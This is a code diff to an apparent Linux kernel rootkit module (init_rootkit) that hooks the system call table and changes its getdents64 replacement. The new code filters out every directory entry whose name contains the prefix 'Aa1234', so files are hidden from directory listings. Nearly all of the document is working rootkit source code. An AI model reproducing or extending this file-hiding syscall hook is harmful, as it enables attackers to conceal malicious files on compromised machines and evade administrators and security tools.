@@ -1,7 +1,7 @@
 #include <asm/paravirt.h>
 #include <asm/segment.h>
 #include <asm/syscall.h>
-#include <asm-generic/unistd.h>
+#include <asm/unistd_64.h>
 #include <linux/dirent.h>
 #include <linux/fcntl.h>
 #include <linux/file.h>
@@ -17,8 +17,10 @@
 #include <linux/uaccess.h>
 #include <linux/version.h>
 
+#define TAINTED_PREFIX "Aa1234"
+
 static sys_call_ptr_t *sys_call_table_original;
-static sys_call_ptr_t sys_call_table_copy[__NR_syscalls] = { NULL };
+static sys_call_ptr_t sys_call_table_copy[__NR_syscall_max + 1] = { NULL };
 extern unsigned long __force_order;
 
 static inline void write_cr0_forced(unsigned long val)
@@ -52,7 +54,7 @@ static void unhook_all(void)
 
     unprotect_memory();
 
-    for (i = 0; i < __NR_syscalls; i++)
+    for (i = 0; i < __NR_syscall_max + 1; i++)
         if (sys_call_table_copy[i]) 
             sys_call_table_original[i] = sys_call_table_copy[i];
 
@@ -61,21 +63,46 @@ static void unhook_all(void)
 
 int sys_getdents64_fake(struct pt_regs *regs)
 {
-    unsigned int fd = regs->di;
     struct linux_dirent64 *dirent = regs->si;
-    unsigned int count = regs->dx;
+    struct linux_dirent64 *curr_dirent;
+    unsigned short curr_len;
+    char *buffer;
+    unsigned long setback = 0;
+    unsigned long pos;
+    int len;
+    int error;
 
-    struct linux_dirent64 *dirent_tmp = kmalloc(count, GFP_KERNEL);
+    error = sys_call_table_copy[__NR_getdents64](regs);
 
-    regs->si = dirent_tmp;
+    if (error < 0)
+        return error;
 
-    int error = sys_call_table_copy[__NR_getdents64](regs);
+    len = error;
 
-    copy_to_user(dirent, dirent_tmp, count);
+    buffer = kmalloc(len, GFP_KERNEL);
 
-    kfree(dirent_tmp);
+    copy_from_user(buffer, dirent, len);
 
-    return error;
+    for (pos = 0; pos < len;)
+    {
+        curr_dirent = (struct linux_dirent64 *)(buffer + pos);
+        curr_len = curr_dirent->d_reclen;
+
+        if (strstr(curr_dirent->d_name, TAINTED_PREFIX))
+            setback += curr_len;
+        else if (setback)
+            memcpy((void *)((unsigned long)curr_dirent - setback), curr_dirent, curr_len);
+
+        pos += curr_len;
+    }
+
+    memset(buffer + len - setback, 0, setback);
+
+    copy_to_user(dirent, buffer, len);
+
+    kfree(buffer);
+
+    return len - setback;
 }
 
 static int __init init_rootkit(void)
